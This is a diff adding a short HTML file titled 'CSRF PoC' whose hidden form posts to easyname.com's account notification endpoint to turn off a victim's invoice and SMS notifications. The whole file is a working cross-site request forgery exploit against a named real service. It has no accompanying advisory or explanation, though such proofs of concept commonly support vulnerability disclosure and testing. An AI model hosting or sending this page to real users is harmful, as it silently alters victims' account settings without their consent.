@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><title>CSRF poc</title></head>
+	<body>
+		<h1>CSRF PoC</h1>
+		<form method="POST" action="https://my.easyname.com/en/account/notification">
+			<input type="hidden" name="invoice" value="0">
+			<input type="hidden" name="sms" value="0">
+			<input type="hidden" name="submit" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
